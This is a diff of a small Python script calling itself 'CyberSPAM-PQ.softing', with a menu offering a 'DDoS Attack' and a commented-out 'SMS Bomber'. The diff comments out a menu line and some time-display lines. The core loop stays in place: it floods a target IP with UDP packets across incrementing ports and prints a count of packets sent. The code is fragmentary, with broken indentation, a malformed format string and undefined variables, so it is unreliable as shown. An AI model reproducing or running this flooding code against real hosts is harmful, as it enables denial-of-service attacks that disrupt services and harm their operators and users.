@@ -25,7 +25,7 @@ port = 0
 print('##########################################')
 print ('Wellcome to CyberSPAM-PQ.softing')
 print()
-print ('Get SOFT')
+#print ('Get SOFT')
 print ('[1] - DDoS Attack http://SITE')
 #   print ('[2] - SMS Bomber')
 print()
@@ -56,13 +56,15 @@ print('##########################################')
 nowhour = 0
 nowminute = 0
 
+#nowhour = now.hour*1
+#nowminute = now.minute*1
+
 while True:
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
-            nowhour = now.hour*1
-            nowminute = now.minute*1
-   print('time %s:%s'%(nowhour,nowminute))
+            
+   #print('time %s:%s'%(nowhour,nowminute))
    print('sent packet: s% to %s on port:%s'%(sent,ip,port))
 
      if port == 65534:
